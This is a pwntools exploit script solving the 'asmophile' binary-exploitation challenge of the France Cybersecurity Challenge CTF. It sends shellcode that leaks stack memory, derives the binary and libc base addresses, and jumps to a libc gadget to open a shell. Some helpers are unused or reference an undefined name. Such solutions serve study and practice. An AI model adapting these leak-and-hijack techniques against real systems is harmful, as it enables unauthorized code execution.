#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('./asmophile')
pwn.context.terminal = ["tilix","-a","session-add-right","-e"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or 'challenges2.france-cybersecurity-challenge.fr'
port = int(pwn.args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
brva 0x1456
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst

# stage 1 shellcode

shellcode = '''
push rsp
pop  rsi
xor  eax, eax
inc  eax
xor  edi, edi
inc  edi
xor  edx, edx
mov  dl,  0xff
syscall
xor  eax, eax
dec  edi
syscall
xor  eax, eax
xor  ebx, ebx
xor  ecx, ecx
xor  edx, edx
xor  edi, edi
xor  esi, esi
ret
'''
io.sendlineafter("assembly?\n", pwn.asm(shellcode))
time.sleep(1)
leak = io.recv(0xff)
binary = pwn.u64(leak[:8]) - 0x1458
libc = pwn.u64(leak[0xe0:0xe8]) - 0x26d0a

pop_rdi = binary + 0x14db
ret_gdt = binary + 0x1016
system = libc + 0x48df0
bin_sh = libc + 0x18a152
puts = libc + 0x765f0
gets = libc + 0x75b60

rop  = b""
rop += pwn.p64(libc + 0xcbd20)

pwn.info("Libc   : 0x%x" % libc)
pwn.info("Binary : 0x%x" % binary)

io.sendline(rop)

io.interactive()